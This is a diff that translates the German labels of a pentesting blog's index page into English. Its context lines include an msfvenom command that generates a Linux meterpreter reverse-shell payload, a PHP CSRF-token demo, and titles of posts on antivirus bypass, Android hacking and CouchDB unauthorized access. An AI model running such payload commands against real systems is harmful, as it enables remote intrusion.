@@ -175,7 +175,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Home
           </a>
         </li>
       
@@ -185,7 +185,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -208,7 +208,7 @@
             
               <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
             
-            Suche
+            Search
           </a>
         </li>
       
@@ -274,7 +274,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-27T13:27:59+08:00" content="2016-05-27">
               2016-05-27
             </time>
@@ -315,7 +315,7 @@
 <h2 id="Binaries"><a href="#Binaries" class="headerlink" title="Binaries"></a>Binaries</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/27/Generate-Metasploit-Payloads/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -378,7 +378,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-26T23:34:37+08:00" content="2016-05-26">
               2016-05-26
             </time>
@@ -421,7 +421,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;name&apos;])) &#123;</span><br><span class="line">    $token = md5(uniqid(rand(), TRUE));</span><br><span class="line">    $_SESSION[&apos;token&apos;] = $token;</span><br><span class="line">    file_put_contents($debugFile, &quot;\nissuing token: &quot; . $token, FILE_APPEND | LOCK_EX);</span><br><span class="line">    echo &apos;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">            &lt;body&gt;</span><br><span class="line"></span><br><span class="line">                &lt;form  id=&quot;form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&apos; . $token . &apos;&quot; /&gt;</span><br><span class="line">                    Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;</span><br><span class="line">                    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">            &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;&apos;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ($_POST[&apos;token&apos;] == $_SESSION[&apos;token&apos;]) &#123;</span><br><span class="line">        echo &quot;\ntoken ok: &quot; . $_POST[&apos;name&apos;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;\nwrong token given: &quot; . $_POST[&apos;token&apos;] . &quot; expected: &quot; . $_SESSION[&apos;token&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/26/Bypass-CSRF-Protection-via-XSS/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -484,7 +484,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-26T16:54:15+08:00" content="2016-05-26">
               2016-05-26
             </time>
@@ -528,7 +528,7 @@ Start msfvenom1&gt;msfvenom -p wind
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/26/Bypass-Antivirus-via-foolav/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -591,7 +591,7 @@ Start msfvenom1&gt;msfvenom -p wind
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-26T14:47:25+08:00" content="2016-05-26">
               2016-05-26
             </time>
@@ -634,7 +634,7 @@ Start msfvenom1&gt;msfvenom -p wind
 </ol>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/26/Crack-md5-hash-using-metasploit/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -697,7 +697,7 @@ Start msfvenom1&gt;msfvenom -p wind
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-26T14:13:16+08:00" content="2016-05-26">
               2016-05-26
             </time>
@@ -742,7 +742,7 @@ BurpSuite &
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/26/ImageTragick-using-BurpSuite-and-Metasploit/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -805,7 +805,7 @@ BurpSuite &
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-20T00:44:57+08:00" content="2016-05-20">
               2016-05-20
             </time>
@@ -849,7 +849,7 @@ POC:123
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/20/CouchDB-unauthorized-access/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -912,7 +912,7 @@ POC:123
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-17T10:09:44+08:00" content="2016-05-17">
               2016-05-17
             </time>
@@ -955,7 +955,7 @@ POC:123
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/17/Hacking-Android-Mobile-Through-Metasploit/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1018,7 +1018,7 @@ POC:123
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-15T22:59:16+08:00" content="2016-05-15">
               2016-05-15
             </time>
@@ -1062,7 +1062,7 @@ POC:123
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/15/Port-Hacking/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1125,7 +1125,7 @@ POC:123
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-15T14:21:04+08:00" content="2016-05-15">
               2016-05-15
             </time>
@@ -1166,7 +1166,7 @@ POC:123
 <h3 id="Win2008-2012-Server"><a href="#Win2008-2012-Server" class="headerlink" title="Win2008/2012 Server"></a>Win2008/2012 Server</h3>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1229,7 +1229,7 @@ POC:123
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-05-13T00:54:31+08:00" content="2016-05-13">
               2016-05-13
             </time>
@@ -1271,7 +1271,7 @@ POC:123
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database ips;</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/13/Get-ip-through-Image/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1346,7 +1346,7 @@ POC:123
           <div class="site-state-item site-state-posts">
             <a href="/archives">
               <span class="site-state-item-count">41</span>
-              <span class="site-state-item-name">Artikel</span>
+              <span class="site-state-item-name">posts</span>
             </a>
           </div>
 
@@ -1356,7 +1356,7 @@ POC:123
             <div class="site-state-item site-state-tags">
               <a href="/tags">
                 <span class="site-state-item-count">37</span>
-                <span class="site-state-item-name">Tags</span>
+                <span class="site-state-item-name">tags</span>
               </a>
             </div>
           
@@ -1430,7 +1430,7 @@ POC:123
 </div>
 
 <div class="powered-by">
-  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
 </div>
 
 <div class="theme-info">
